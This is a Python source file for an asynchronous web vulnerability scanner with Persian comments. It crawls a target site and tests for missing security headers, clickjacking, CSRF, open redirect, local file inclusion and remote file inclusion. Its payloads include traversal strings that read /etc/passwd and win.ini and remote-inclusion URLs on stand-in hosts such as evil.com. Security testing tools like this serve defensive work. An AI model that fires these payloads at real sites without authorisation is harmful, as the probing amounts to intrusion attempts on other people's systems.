import aiohttp
import asyncio
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import json
from tqdm import tqdm
from datetime import datetime

class AdvancedScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = aiohttp.ClientSession()
        self.links_to_scan = set()
        self.scanned_links = set()
        self.vulnerabilities = []
        self.report_file = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.log_file = f"scan_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    async def extract_links(self, url):
        """استخراج لینک‌های موجود در صفحه"""
        try:
            async with self.session.get(url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                for link in soup.find_all("a", href=True):
                    full_url = urljoin(url, link["href"])
                    if self.target_url in full_url and full_url not in self.scanned_links:
                        self.links_to_scan.add(full_url)
        except Exception as e:
            self.log_error(f"Error extracting links from {url}: {e}")

    async def check_security_headers(self, url):
        """بررسی سرآیندهای امنیتی"""
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                missing_headers = []
                required_headers = [
                    "Content-Security-Policy",
                    "X-Frame-Options",
                    "X-Content-Type-Options",
                    "Strict-Transport-Security",
                    "Referrer-Policy",
                ]
                for header in required_headers:
                    if header not in headers:
                        missing_headers.append(header)
                if missing_headers:
                    self.add_vulnerability(url, "Missing Security Headers", missing_headers)
        except Exception as e:
            self.log_error(f"Error checking headers on {url}: {e}")

    async def scan_clickjacking(self, url):
        """بررسی کلیک‌جکینگ"""
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                if "X-Frame-Options" not in headers:
                    self.add_vulnerability(url, "Clickjacking", "X-Frame-Options header missing")
        except Exception as e:
            self.log_error(f"Clickjacking error on {url}: {e}")

    async def scan_csrf(self, url):
        """بررسی CSRF"""
        try:
            async with self.session.get(url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                if not soup.find("input", {"type": "hidden", "name": "csrf_token"}):
                    self.add_vulnerability(url, "CSRF", "CSRF token not found")
        except Exception as e:
            self.log_error(f"CSRF error on {url}: {e}")

    async def scan_open_redirect(self, url):
        """بررسی Open Redirect"""
        payload = "/?redirect=http://malicious-site.com"
        redirect_url = urljoin(url, payload)
        try:
            async with self.session.get(redirect_url) as response:
                if "malicious-site.com" in str(response.url):
                    self.add_vulnerability(url, "Open Redirect", redirect_url)
        except Exception as e:
            self.log_error(f"Open Redirect error on {url}: {e}")

    async def scan_lfi(self, url):
        """بررسی Local File Inclusion"""
        payloads = ["../../../../etc/passwd", "../windows/win.ini"]
        for payload in payloads:
            lfi_url = f"{url}/{payload}"
            try:
                async with self.session.get(lfi_url) as response:
                    html = await response.text()
                    if "root:" in html or "[fonts]" in html:
                        self.add_vulnerability(url, "Local File Inclusion (LFI)", payload)
            except Exception as e:
                self.log_error(f"LFI error on {lfi_url}: {e}")

    async def scan_rfi(self, url):
        """بررسی Remote File Inclusion"""
        payloads = [
            "http://malicious-site.com/shell.txt",
            "https://evil.com/malicious.php",
        ]
        params = self.extract_params(url)
        for param in params:
            for payload in payloads:
                rfi_url = self.inject_payload(url, param, payload)
                try:
                    async with self.session.get(rfi_url) as response:
                        if "malicious" in await response.text():
                            self.add_vulnerability(url, "Remote File Inclusion (RFI)", payload)
                except Exception as e:
                    self.log_error(f"RFI error on {rfi_url}: {e}")

    async def scan_subdomains(self):
        """بررسی زیر دامنه‌ها"""
        subdomains = [
            "admin", "api", "dev", "test", "staging", "blog", "secure", "mail"
        ]
        for subdomain in subdomains:
            subdomain_url = f"https://{subdomain}.{urlparse(self.target_url).netloc}"
            try:
                async with self.session.get(subdomain_url) as response:
                    if response.status < 400:
                        self.add_vulnerability(subdomain_url, "Exposed Subdomain")
            except:
                pass

    def extract_params(self, url):
        """استخراج پارامترهای ورودی URL"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        return list(query.keys())

    def inject_payload(self, url, param, payload):
        """تزریق Payload به پارامترها"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        query[param] = payload
        new_query = "&".join(f"{k}={v}" for k, v in query.items())
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

    def add_vulnerability(self, url, vuln_type, details=None):
        """افزودن آسیب‌پذیری به لیست"""
        self.vulnerabilities.append({
            "url": url,
            "type": vuln_type,
            "details": details,
        })
        print(f"[!] Found {vuln_type} on {url}")

    def log_error(self, message):
        """ثبت خطاها"""
        with open(self.log_file, "a") as f:
            f.write(f"[ERROR] {message}\n")

    async def start_scan(self):
        """شروع اسکن"""
        print(f"[*] Scanning {self.target_url}...")
        self.links_to_scan.add(self.target_url)
        await self.extract_links(self.target_url)

        with tqdm(total=len(self.links_to_scan)) as pbar:
            while self.links_to_scan:
                url = self.links_to_scan.pop()
                if url not in self.scanned_links:
                    self.scanned_links.add(url)
                    pbar.update(1)
                    await asyncio.gather(
                        self.check_security_headers(url),
                        self.scan_clickjacking(url),
                        self.scan_csrf(url),
                        self.scan_open_redirect(url),
                        self.scan_lfi(url),
                        self.scan_rfi(url),
                    )
        await self.generate_report()

    async def generate_report(self):
        """تولید گزارش JSON"""
        with open(self.report_file, "w") as f:
            json.dump(self.vulnerabilities, f, indent=4)
        print(f"[!] Report saved to {self.report_file}")
        await self.session.close()
